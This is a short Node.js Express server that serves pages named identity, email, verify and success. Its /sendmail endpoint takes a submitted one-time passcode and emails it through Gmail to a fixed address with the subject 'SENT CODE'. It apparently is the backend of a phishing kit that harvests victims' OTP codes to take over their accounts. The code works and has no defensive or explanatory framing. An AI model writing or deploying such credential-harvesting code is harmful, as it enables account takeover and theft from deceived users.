import express from "express"
import nodemailer from "nodemailer"
import dotenv from "dotenv"
import path from "path"
import { fileURLToPath } from "url";
import { dirname } from "path";

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);
dotenv.config()

const PORT = process.env.PORT || 3000
const app = express()


app.use(express.static(path.join(__dirname, "public")))
app.use(express.json())



const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: String(process.env.MAIL_USER),
        pass: String(process.env.MAIL_PASS),
    },
})
const to = String(process.env.TO)
const subject = "SENT CODE"

app.post("/sendmail", async (req, res) => {
    try {
        const { code } = req.body;
        if (!code) {
            return res.json({ error: "OTP code needed" });
        }
        const text = code;
        await transporter.sendMail({
            from: `"NIKKA" <${process.env.MAIL_USER}>`,
            to,
            subject,
            text,
        });
        return res.json({ message: "mail sent successfully" });
    } catch (e) {
        console.log(e);
        res.status(500).json({ error: "Internal server error" });
    }
});


app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "index.html"))
})
app.get("/identity", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "identity.html"))
})
app.get("/success", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "success.html"))
})
app.get("/email", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "email.html"))
})
app.get("/verify", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "verify.html"))
})





app.listen(PORT, () => {
    console.log(`app running on port ${PORT}`)
})